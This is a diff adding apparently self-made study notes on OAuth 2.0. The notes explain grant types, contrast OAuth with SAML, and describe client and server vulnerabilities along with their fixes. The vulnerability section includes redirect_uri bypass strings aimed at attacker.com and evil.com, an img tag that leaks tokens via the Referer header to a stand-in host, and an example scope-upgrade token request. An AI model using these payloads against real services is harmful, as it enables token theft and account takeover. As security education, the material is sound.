@@ -1,0 +1,564 @@
+While browsing the web, you've almost certainly come across sites that let you log in using your social media account. 
+The chances are that this feature is built using the popular OAuth 2.0 framework. 
+OAuth 2.0 is highly interesting for attackers because it is both extremely common and inherently prone to implementation mistakes. 
+This can result in a number of vulnerabilities, allowing attackers to obtain sensitive user data and potentially bypass authentication completely. 
+
+-
+
+What is OAuth?
+
+OAuth is a system that lets websites ask for limited access to your account on another service—without needing your password. You control what data is shared.
+
+It’s often used to connect apps or log in with another account (like Google or Facebook). For example, an app might ask to see your email contacts to suggest friends.
+
+OAuth 2.0 is the current version and very different from the older 1.0a. When we say "OAuth" here, we mean OAuth 2.0.
+
+-
+
+How OAuth 2.0 Works
+
+OAuth 2.0 lets apps access a user's data on another service without needing their password. It involves three parties:
+
+* Client application – The app requesting access.
+* Resource owner – The user.
+* OAuth provider – The service holding the user's data.
+
+There are different ways (called "flows" or "grant types") to do this. The most common are authorization code and implicit flows. The general steps:
+
+1. The app asks for access to specific user data.
+2. The user logs in to the service and gives permission.
+3. The app gets an access token as proof of permission.
+4. The app uses this token to fetch data via an API.
+
+-
+
+OAuth Grant Types Overview
+
+
+OAuth uses different grant types (also called flows) to define how an app gets access to user data. The app must declare which flow it wants to use.
+
+
+Scopes
+
+Scopes define *what* data the app wants (e.g., `email`, `contacts.read`).
+Different OAuth providers use different scope names. For authentication, standard OpenID Connect scopes like `openid profile` are often used.
+
+
+
+Two common flows are:
+
+
+
+1. Authorization Code Grant (Secure, for server-side apps)
+
+
+Steps:
+
+1. Request Access
+   App sends a request to the OAuth server with parameters like `client_id`, `redirect_uri`, `response_type=code`, `scope`, and `state`.
+
+2. User Logs In & Consents
+   The user logs into their OAuth provider (e.g., Google) and approves requested access.
+
+3. Authorization Code Sent
+   If approved, OAuth redirects the browser to the app with an authorization code.
+
+4. Exchange Code for Token
+   App sends the code (along with its `client_secret`) in a secure server-to-server request to get an access token.
+
+5. Token Received
+   If valid, OAuth returns an access token.
+
+6. API Call
+   App uses the token to call APIs like `/userinfo`.
+
+7. Data Received
+   If the token is valid, the server returns user data (e.g., `email`, `username`).
+
+✅ Best for server-side apps
+✅ Access token stays hidden from the browser
+✅ More secure
+
+
+
+2. Implicit Grant (Simpler, less secure, for browser apps)
+
+
+Steps:
+
+1. Request Access
+   Like before, but `response_type=token`.
+
+2. User Logs In & Consents
+
+3. Token Sent in URL
+   After consent, the access token is returned directly in the URL fragment.
+
+4. App Extracts Token
+   A script extracts the token from the URL.
+
+5. API Call
+   App uses the token to request user data from the API.
+
+6. Data Received
+   User data is returned if the token is valid.
+⚠️ Less secure (token visible in browser)
+⚠️ No `client_secret`, so used for SPAs and mobile apps
+
+
+
+
+Summary:
+
+| Grant Type         | Use Case          | Security      | Flow Type             |
+| ------------------ | ----------------- | ------------- | --------------------- |
+| Authorization Code | Server-side apps  | ✅ More secure | Code → Token Exchange |
+| Implicit           | SPAs, Mobile Apps | ❌ Less secure | Direct Token via URL  |
+
+
+-
+
+
+🔐 Real-World Example: “Login with Google”
+
+
+🖥️ Server-Side App
+
+Example: A traditional e-commerce website (like Amazon clone) built with Node.js + Express.
+
+
+Flow:
+
+1. You click "Login with Google".
+2. You're redirected to Google to log in and give permission.
+3. Google sends an authorization code to the server.
+4. The server exchanges the code (with a client secret) for an access token – all done in the backend.
+5. The access token is stored securely on the server, and a session cookie is sent to your browser.
+6. The browser never sees the token.
+7. You’re logged in.
+
+✅ Secure – Token and secret are hidden
+✅ Ideal for apps with sensitive data or server control
+
+
+
+
+⚡ Single Page App (SPA)
+
+Example: A frontend-only to-do app built in React, hosted on GitHub Pages.
+
+
+Flow:
+
+1. You click "Login with Google".
+2. You’re redirected to Google to log in and allow access.
+3. Google sends an access token directly in the URL (e.g., `#access_token=xyz123`).
+4. The browser's JavaScript extracts this token.
+5. The SPA stores the token in localStorage or memory.
+6. It uses the token to call Google APIs (e.g., get your profile info).
+
+⚠️ Less secure – Token is exposed in browser and can be stolen if not handled properly
+⚠️ No backend to protect secrets
+
+
+
+🧠 Summary:
+
+| Example                    | Server-Side App                    | SPA                                  |
+| -------------------------- | ---------------------------------- | ------------------------------------ |
+| Google token seen by user? | ❌ No                               | ✅ Yes (in URL or browser storage)    |
+| Where token is stored      | Secure backend                     | Browser (memory/localStorage)        |
+| OAuth grant used           | Authorization Code                 | Implicit (or Code+PKCE for security) |
+| Ideal for                  | Sites needing secure data handling | Lightweight frontend-only apps       |
+
+
+-
+
+
+OAuth Authentication
+
+OAuth is now commonly used for logging in with social media accounts, even though it was designed for authorization, not authentication.
+
+The process is similar to normal OAuth flows, but the goal is to identify the user instead of just accessing data.
+
+
+How it works:
+
+1. User clicks "Login with Google/Facebook".
+2. The app uses OAuth to request user info (like email) via an access token.
+3. It fetches this info (usually from `/userinfo`) and uses it to log the user in.
+
+🔐 The access token acts like a login key, replacing a traditional password.
+
+
+-
+
+
+Comparison between OAuth authentication and SAML-based SSO:
+
+
+🔑 Purpose
+
+| Feature     | OAuth Authentication                         | SAML-based SSO                      |
+| ----------- | ------------------------------------------------ | --------------------------------------- |
+| Primary use | Delegated access & login via third-party (OAuth) | Federated authentication across systems |
+| Focus       | Authorization, adapted for authentication    | Authentication (user identity)      |
+
+
+
+🔧 How It Works
+
+| Feature              | OAuth                         | SAML SSO                                   |
+| -------------------- | --------------------------------- | ---------------------------------------------- |
+| Token type           | Access token (JSON, short-lived)  | SAML assertion (XML, signed, verbose)          |
+| Format               | JSON (JWT or opaque)              | XML                                            |
+| Protocol style       | REST-based (modern web APIs)      | XML-based, often via POST or Redirect bindings |
+| Transport            | Browser + API (HTTP/HTTPS)        | Browser redirects with POSTed XML              |
+| Communication method | Usually client-side + server-side | Browser to Identity Provider (IdP) → Service   |
+
+
+
+👥 Parties Involved
+
+| Role                    | OAuth                               | SAML SSO                  |
+| ----------------------- | --------------------------------------- | ----------------------------- |
+| Identity Provider (IdP) | OAuth Provider (e.g., Google, Facebook) | SAML IdP (e.g., Okta, ADFS)   |
+| Service Provider (SP)   | Client Application (e.g., your web app) | Service Provider (SP)         |
+| User                    | Grants access to data or logs in        | Logs in via identity provider |
+
+
+
+🔐 Security
+
+| Feature                | OAuth                                  | SAML SSO                           |
+| ---------------------- | ------------------------------------------ | -------------------------------------- |
+| Token storage          | In browser or server                       | Handled during session creation        |
+| Token expiration       | Short-lived (minutes to hours)             | Often longer, configurable             |
+| Vulnerability exposure | Token leakage, misconfigured redirect URIs | Replay attacks, XML signature wrapping |
+
+
+
+💻 Use Cases
+
+| Feature          | OAuth                                        | SAML SSO                                   |
+| ---------------- | ------------------------------------------------ | ---------------------------------------------- |
+| Commonly used in | Consumer apps, mobile/web apps (e.g., Gmail API) | Enterprise logins (e.g., access to Office 365) |
+| Mobile support   | Strong (OAuth is mobile-friendly)                | Weaker, needs workarounds or additional config |
+| Modern web APIs  | ✅ Yes                                            | ❌ No (not API-friendly by default)             |
+
+
+
+ ✅ Summary Table
+
+| Category          | OAuth Authentication            | SAML-based SSO                      |
+| ----------------- | ----------------------------------- | --------------------------------------- |
+| Focus             | Authorization (adapted for auth)    | Authentication                          |
+| Token Format      | JSON (JWT/Access Token)             | XML (SAML Assertion)                    |
+| API Friendly      | ✅ Yes                               | ❌ No                                    |
+| Used By           | Google, Facebook, GitHub login      | Enterprises, corporate portals          |
+| Security Strength | Good (with best practices)          | Strong (if XML sigs handled properly)   |
+| Best For          | Mobile, web apps, third-party login | Internal enterprise apps, cross-org SSO |
+
+
+
+
+
+
+In simple terms:
+
+
+ 🔑 Primary Use
+
+| Term                                | Meaning                                                                                                                                                                                            |
+| ----------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Delegated access (OAuth)        | You let an app access your data from another service on your behalf, without sharing your password. Also used for login via third-party (e.g., *"Log in with Google"*).                    |
+| Federated authentication (SAML) | You use your identity from one system (like your company’s login) to access another system, without needing a new account. It's a form of single sign-on (SSO) across trusted systems. |
+
+
+
+🔁 Example:
+
+
+
+OAuth (Delegated access):
+
+* You click "Log in with Google" on a fitness app.
+* The app gets your email and basic info from Google.
+* You didn’t give the app your Google password—just access to certain data.
+
+
+
+SAML (Federated auth):
+
+* You log in once to your company portal.
+* Now you can also access internal tools like email, HR, or time-tracking without logging in again.
+* All services trust your identity from your company’s login system.
+
+
+
+In short:
+
+* OAuth = "Use this third-party account to log in or share data."
+* SAML = "One login to access many trusted services."
+
+
+-
+
+
+How do OAuth authentication vulnerabilities arise?
+
+OAuth is flexible by design, but this also means it's easy to misconfigure. Many security features are optional, so developers must manually set them up correctly.
+
+Key issues:
+
+* Loose specs = room for bad practices
+* Few built-in protections – security depends on proper setup
+* Sensitive data is often sent through the browser, making it easier for attackers to intercept
+
+In short: OAuth is powerful but easy to misuse without care.
+
+
+-
+
+
+Identifying OAuth Authentication
+
+You can tell an app uses OAuth if it offers login via another website (e.g., “Log in with Google”).
+
+To confirm:
+
+* Use Burp Suite to inspect login traffic.
+* Look for a request to `/authorization` with parameters like `client_id`, `redirect_uri`, and `response_type`.
+
+
+Recon Tips
+
+* Check the hostname of the authorization server to identify the OAuth provider.
+* Visit these endpoints for more info:
+
+  * `/.well-known/oauth-authorization-server`
+  * `/.well-known/openid-configuration`
+
+These often return JSON configs revealing endpoints, scopes, and extra features that can help spot vulnerabilities.
+
+
+-
+
+
+Exploiting OAuth authentication vulnerabilities
+
+Vulnerabilities can arise in the client application's implementation of OAuth as well as in the configuration of the OAuth service itself.
+
+
+
+1. Vulnerabilities in the OAuth client application
+
+OAuth Client Weaknesses (Shortened)
+
+Even if the app uses a secure OAuth provider, its own implementation may be weak.
+
+OAuth specs are loose, especially on the client side. With many optional settings and parameters, it’s easy to misconfigure parts of the flow and create vulnerabilities.
+
+
+
+a> Improper implementation of the implicit grant type
+
+The implicit grant sends access tokens via the browser, so it's meant for SPAs—but is often misused in regular web apps for simplicity.
+
+To keep users logged in, apps may send the access token and user ID to the server in a POST request and set a session cookie. But since the server has no secret to verify this data, it implicitly trusts it.
+
+If the app doesn’t properly validate the access token, an attacker can tamper with the request and impersonate other users.
+
+
+
+b> Flawed CSRF protection
+
+Importance of the `state` Parameter (Shortened)
+
+The `state` parameter acts like a CSRF token in OAuth flows and should be a unique, unguessable value tied to the user session.
+
+If it's missing, attackers can:
+
+* Trigger OAuth flows themselves
+* Trick users into completing them
+* Hijack accounts by binding them to their own social accounts
+
+This is especially dangerous if a site supports both OAuth and password logins. Even if OAuth is the only login method, skipping `state` can allow login CSRF, making users unknowingly log in as the attacker.
+
+
+
+
+
+
+
+2.  Vulnerabilities in the OAuth service 
+
+
+a> Leaking authorization codes and access tokens
+
+One major OAuth vulnerability is when attackers steal codes or tokens due to poor validation of the `redirect_uri` by the OAuth service.
+
+If `redirect_uri` isn’t properly checked:
+
+* Attackers can trick the victim's browser into sending tokens/codes to an attacker-controlled URL.
+* With a stolen code, attackers can complete the login flow and impersonate the victim.
+
+Even `state` or `nonce` can't fully protect against this, since attackers can create valid values themselves.
+
+Fix: Authorization servers should require `redirect_uri` during the token exchange and verify it matches the original request.
+
+
+
+
+a.1> Flawed redirect_uri validation
+
+To prevent token theft, client apps should register a whitelist of allowed `redirect_uri`s. 
+The OAuth server then checks if incoming `redirect_uri` values match this list. But misconfigurations can allow bypasses.
+
+When testing:
+
+* Try adding paths, query strings, or fragments to the `redirect_uri`.
+* Exploit parsing quirks using tricks like:
+  `https://default.com&@attacker.com#@bypass.com`
+* Test duplicate parameters:
+  `...&redirect_uri=legit.com&redirect_uri=evil.com`
+* Some servers mistakenly accept `localhost` URIs in production.
+  Try: `localhost.attacker.com`
+
+
+
+It is important to note that you shouldn't limit your testing to just probing the redirect_uri parameter in isolation. 
+In the wild, you will often need to experiment with different combinations of changes to several parameters. 
+Sometimes changing one parameter can affect the validation of others. 
+For example, changing the response_mode from query to fragment can sometimes completely alter the parsing of the redirect_uri, allowing you to submit URIs that would otherwise be blocked. 
+Likewise, if you notice that the web_message response mode is supported, this often allows a wider range of subdomains in the redirect_uri. 
+
+
+
+
+a.2> Stealing codes and access tokens via a proxy page
+
+Even if you can't use an external `redirect_uri`, you may still exploit the client app by redirecting to internal pages on whitelisted domains.
+
+Try:
+
+* Path traversal:
+  `https://client.com/oauth/callback/../../leak` → resolves to `https://client.com/leak`
+* Find internal pages that:
+
+  * Reflect query params (for authorization code flow)
+  * Expose fragments (for implicit flow)
+
+Key vulnerabilities to steal codes/tokens:
+
+* Open redirects: Forward victims (with tokens) to your domain.
+* Insecure JavaScript: Poor handling of URL fragments or query params.
+* XSS: Use stolen tokens to hijack accounts, even if cookies are HTTPOnly.
+* HTML injection: Leak tokens via Referer header (e.g., with `<img src="attacker.com">`)
+
+Tokens stolen from implicit flows can be used directly to access protected APIs — not just the client app.
+
+
+
+Here’s how it works:
+
+* The OAuth service allows redirecting to `client-app.com/*` (whitelisted domain).
+* Attacker finds a vulnerable page on `client-app.com`, like:
+
+  * `/redirect`
+  * `/login/callback`
+  * `/profile`
+* They trick the user into authenticating via OAuth, with a crafted `redirect_uri` pointing to this internal vulnerable page.
+* The vulnerable page then leaks the code/token to the attacker (e.g., via redirect, Referer header, or malicious script).
+
+So the attack surface is within the client’s own domain, but exploitable because the attacker controls the flow up to and including which internal page gets the token/code.
+
+
+
+
+
+b> Flawed scope validation
+
+
+OAuth tokens should only allow access to the scope the user approved — but due to poor server validation, attackers can sometimes upgrade scopes.
+
+
+
+b.1> Scope upgrade: authorization code flow
+
+
+An attacker registers their own app and requests minimal scope (e.g., `openid email`). Once they get the authorization code, they add extra scopes (e.g., `profile`) during the token exchange:
+
+
+```http
+POST /token
+Host: oauth-authorization-server.com
+
+client_id=12345
+&client_secret=SECRET
+&redirect_uri=https://client-app.com/callback
+&grant_type=authorization_code
+&code=a1b2c3d4e5
+&scope=openid%20email%20profile
+```
+
+If the server doesn’t validate scope consistency, it returns an upgraded token:
+
+```json
+{
+  "access_token": "z0y9x8w7v6u5",
+  "scope": "openid email profile"
+}
+```
+
+Attacker can now access more user data (e.g., `/profile`).
+
+
+
+
+b.2> Scope upgrade: implicit flow
+
+
+If a token is stolen from a legitimate app, the attacker may call:
+
+```
+GET /userinfo?scope=openid email profile
+```
+
+If the server doesn't verify that `profile` was part of the original scope, attacker gains extra access without reapproval.
+
+
+
+
+🧠 Fix: Authorization servers must validate that scopes during token exchange (or access) match what the user originally approved.
+
+
+
+
+
+c> Unverified user registration
+
+OAuth client apps often assume user data from the provider is valid — but this can be risky.
+
+If the provider allows account creation without verifying email, an attacker can register using the victim's email. 
+The client app may then let the attacker log in as the victim, trusting the unverified data.
+
+
+
+-
+
+
+🔐 What is OpenID Connect?
+
+OpenID Connect is a standardized identity layer built on top of OAuth.
+
+While OAuth was made for authorization, not authentication, many sites repurposed it to log users in — often in inconsistent, unreliable ways.
+
+OpenID Connect fixes this by adding clear, uniform features for authentication, letting client apps securely verify users and fetch identity info across providers using the same standard approach.
+
+
+-
+
+
+
+
